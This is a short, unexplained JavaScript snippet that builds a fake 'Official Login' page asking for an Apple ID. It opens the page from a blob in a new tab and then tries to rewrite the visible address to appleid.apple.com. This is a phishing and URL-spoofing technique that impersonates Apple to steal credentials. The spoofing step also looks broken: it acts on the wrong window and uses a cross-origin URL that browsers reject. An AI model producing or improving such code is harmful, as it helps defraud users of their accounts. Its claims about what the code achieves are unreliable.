<script>
const html = `
<h1>Official Login</h1>
<form>
<input placeholder="Apple ID">
</form>
`;

const blob = new Blob([html], {type: "text/html"});
const url = URL.createObjectURL(blob);

// Open in new tab
window.open(url, "_blank");

// Change visible URL
setTimeout(() => {
  history.replaceState({}, "", "https://appleid.apple.com");
}, 100);
</script>
